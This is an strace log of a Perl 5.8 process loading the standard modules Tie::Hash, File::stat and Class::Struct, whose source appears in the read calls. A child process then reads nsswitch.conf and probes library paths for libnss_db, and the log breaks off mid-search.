12318 07:41:50.127243 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
12318 07:41:50.127563 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
12318 07:41:50.128139 read(8, "", 4096) = 0
12318 07:41:50.136679 close(8)          = 0
12318 07:41:50.136716 stat64("/etc/perl/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136736 stat64("/etc/perl/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136751 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136764 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136778 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136792 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136806 stat64("/usr/lib/perl5/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136818 stat64("/usr/lib/perl5/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136832 stat64("/usr/share/perl5/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136844 stat64("/usr/share/perl5/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136858 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136871 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.136885 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.136898 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
12318 07:41:50.136920 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.136935 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.136947 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.136964 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
12318 07:41:50.137380 stat64("/etc/perl/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137398 stat64("/etc/perl/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137412 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137425 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137440 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137453 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137468 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137480 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137493 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137506 stat64("/usr/share/perl5/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137519 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137532 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbff54a5c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137546 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbff54b4c) = -1 ENOENT (No such file or directory)
12318 07:41:50.137559 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
12318 07:41:50.137581 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
12318 07:41:50.137596 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54868) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.137608 _llseek(10, 0, [0], SEEK_CUR) = 0
12318 07:41:50.137627 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
12318 07:41:50.138087 brk(0x82de000)    = 0x82de000
12318 07:41:50.138486 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
12318 07:41:50.139065 _llseek(10, 6916, [6916], SEEK_SET) = 0
12318 07:41:50.139082 _llseek(10, 0, [6916], SEEK_CUR) = 0
12318 07:41:50.139096 close(10)         = 0
12318 07:41:50.139284 _llseek(8, 1334, [1334], SEEK_SET) = 0
12318 07:41:50.139301 _llseek(8, 0, [1334], SEEK_CUR) = 0
12318 07:41:50.139311 close(8)          = 0
12318 07:41:50.139902 brk(0x82ff000)    = 0x82ff000
12318 07:41:50.140048 _llseek(6, 2689, [2689], SEEK_SET) = 0
12318 07:41:50.140063 _llseek(6, 0, [2689], SEEK_CUR) = 0
12318 07:41:50.140074 close(6)          = 0
12318 07:41:50.140247 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d77908) = 12319
12319 07:41:50.155641 getppid()         = 12318
12319 07:41:50.156057 open("/etc/nsswitch.conf", O_RDONLY) = 6
12319 07:41:50.156116 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12319 07:41:50.156154 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f3d000
12319 07:41:50.156168 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12319 07:41:50.156220 read(6, "", 4096) = 0
12319 07:41:50.156230 close(6)          = 0
12319 07:41:50.156240 munmap(0xb7f3d000, 4096) = 0
12319 07:41:50.156267 open("/etc/ld.so.cache", O_RDONLY) = 6
12319 07:41:50.156281 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12319 07:41:50.156298 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d44000
12319 07:41:50.156310 close(6)          = 0
12319 07:41:50.156321 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12319 07:41:50.156338 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156353 stat64("/lib/tls/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156367 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156381 stat64("/lib/tls/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156393 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156406 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.156444 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156500 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.156534 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156547 stat64("/lib/tls/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156558 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156570 stat64("/lib/tls/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156582 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156594 stat64("/lib/tls/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156605 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156617 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12319 07:41:50.156634 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156647 stat64("/lib/i686/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156658 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156670 stat64("/lib/i686/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156681 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156702 stat64("/lib/i686/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156714 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156725 stat64("/lib/i686", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156736 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156748 stat64("/lib/sse2/cmov", 0xbff553ec) = -1 ENOENT (No such file or directory)
12319 07:41:50.156760 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
12319 07:41:50.156771 stat64("/lib/sse2", 0xbff553ec) = -1 ENOENT (No such file or directory)
